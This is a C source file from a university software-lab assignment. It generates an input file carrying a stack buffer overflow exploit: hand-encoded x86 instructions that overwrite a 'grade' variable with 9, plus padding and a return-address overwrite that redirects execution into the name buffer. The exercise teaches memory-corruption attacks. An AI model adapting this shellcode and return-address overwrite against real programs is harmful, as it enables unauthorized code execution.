/********************************************
 * Georgios Gerasimos Leventopoulos csd4152 *
 * createdata9.c  Software Lab              *
 ********************************************/
#include <stdio.h>
#include <stdlib.h>

int main(void){
    int i;
    FILE *data9;
    if((data9 = fopen("data9", "w")) == NULL){
        fprintf(stderr, "\nUnable to write file: data9\n\n");
        exit(EXIT_FAILURE);
    }
    
    fprintf(data9, "Georgel");   /* Write my name */
    fputc('\0', data9);         /* The end of my name */

    /* movb $0x39, 0x80d46e8  -   store number '9' in grade */
    fputc(0xc6, data9); 
    fputc(0x05, data9);  

    /* address of grade = 0x80d46e8(data segment) */
    fputc(0xe8, data9);  
    fputc(0x46, data9);
    fputc(0x0d, data9);
    fputc(0x08, data9);

    /* Number 9 in ascii is 57 (dec)*/
    fputc(0x39, data9); /* (57 dec = 0x39 hex) */ 
/*********************************************************************/

    fputc(0xb8, data9);  /* movl $0x8048b6f, %eax    -    jump */ 
    /*  Jump just before printf       */
        /*  0x8048b6f <main+81>: push   $0x80d65e0   */
    fputc(0x6f, data9);    
    fputc(0x8b, data9);
    fputc(0x04, data9);
    fputc(0x08, data9);
    
    /* jmp %eax   (Go to this address) */
    fputc(0xff, data9); 
    fputc(0xe0, data9);

/* Put random things until I am in return address */
    for(i = 0; i < 26; i++)
        fputc('k', data9);
    

    fputc(56, data9);   /* Overwritten  -  go to the return address */

    /* Return address of (c) inside Name - address is 0x80d65e8 */
    fputc(0xe8, data9);
    fputc(0x65, data9);
    fputc(0x0d, data9);
    fputc(0x08, data9);

    /* address of Name = 0x80d65e0 (bss section)*/
    fputc(0xe0, data9);
    fputc(0x65, data9);
    fputc(0x0d, data9);
    fputc(0x08, data9);
    fclose(data9); /* Close the file */
    return 0; /* Return */
}

